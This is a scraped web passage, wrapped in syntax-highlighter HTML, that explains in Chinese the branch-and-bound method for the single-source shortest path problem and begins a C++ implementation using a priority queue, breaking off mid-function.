class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-100\">100</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-101\">101</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-102\">102</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-103\">103</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-104\">104</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-105\">105</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-106\">106</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-107\">107</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-108\">108</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-109\">109</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-110\">110</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-111\">111</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-112\">112</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-113\">113</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-114\">114</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-115\">115</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-116\">116</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-117\">117</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-118\">118</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-119\">119</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-120\">120</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-121\">121</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-122\">122</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-123\">123</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-124\">124</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-125\">125</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-126\">126</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-127\">127</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-128\">128</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-129\">129</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-130\">130</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-131\">131</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-132\">132</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-133\">133</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-134\">134</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-135\">135</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-136\">136</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-137\">137</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-138\">138</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-139\">139</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-140\">140</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-141\">141</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-142\">142</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-143\">143</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-144\">144</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-145\">145</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-146\">146</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-147\">147</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-148\">148</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-149\">149</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-150\">150</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-1\"><span class=\"crayon-cn\">2.</span>剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。<span class=\"crayon-h\">   </span>在算法中，利用结点间的控制关系进行剪枝。从源顶点<span class=\"crayon-i\">s</span>出发，<span class=\"crayon-cn\">2</span>条不同路径到达图<span class=\"crayon-i\">G</span>的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.</span>算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图<span class=\"crayon-i\">G</span>的源顶点<span class=\"crayon-i\">s</span>和空优先队列开始。结点<span class=\"crayon-i\">s</span>被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点<span class=\"crayon-i\">i</span>到顶点<span class=\"crayon-i\">j</span>有边可达，且从源出发，途经顶点<span class=\"crayon-i\">i</span>再到顶点<span class=\"crayon-i\">j</span>的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现<span class=\"crayon-c\">/* 主题：单源最短路径问题</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-2\"><span class=\"crayon-c\">* 作者：chinazhangjie</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-3\"><span class=\"crayon-c\">* 邮箱：chinajiezhang@gmail.com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-4\"><span class=\"crayon-c\">* 开发语言：C++</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-5\"><span class=\"crayon-c\">* 开发环境：Mircosoft Virsual Studio 2008</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-6\"><span class=\"crayon-c\">* 时间: 2010.11.01</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-7\"><span class=\"crayon-c\">*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-9\"><span class=\"crayon-p\">#include &lt;iostream&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-10\"><span class=\"crayon-p\">#include &lt;vector&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-11\"><span class=\"crayon-p\">#include &lt;queue&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-12\"><span class=\"crayon-p\">#include &lt;limits&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-13\"><span class=\"crayon-e\">using </span><span class=\"crayon-t\">namespace</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-15\"><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">node_info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-16\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-17\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">weight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-24\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">friend </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-26\"><span class=\"crayon-e\">    </span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">operator</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_info</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lth</span><span class=\"crayon-sy\">,</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_info</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rth</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lth</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rth</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 为了实现从小到大的顺序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-30\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 结点位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 权值</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-33\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-35\"><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path_info</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-36\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-37\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">path_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">front_index</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">numeric_limits</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-40\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-41\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">front_index</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-44\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-45\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-46\"><span class=\"crayon-c\">// single source shortest paths</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-47\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ss_shortest_paths</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-48\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-49\"><span class=\"crayon-h\">     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-50\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">ss_shortest_paths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_location</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-52\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">no_edge</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">end_node</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">end_location</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">node_count</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">graph</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-54\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-55\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 打印最短路径</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print_spaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-57\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">cout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"min weight : \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shortest_path</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">endl</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-58\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">cout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"path: \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-59\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">copy</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">rbegin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">rend</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-60\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">ostream_iterator</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cout</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" \"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">cout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">endl</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 求最短路径</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-65\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shortest_paths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-66\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">path_info</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">node_count</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-67\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">priority_queue</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">node_info</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span 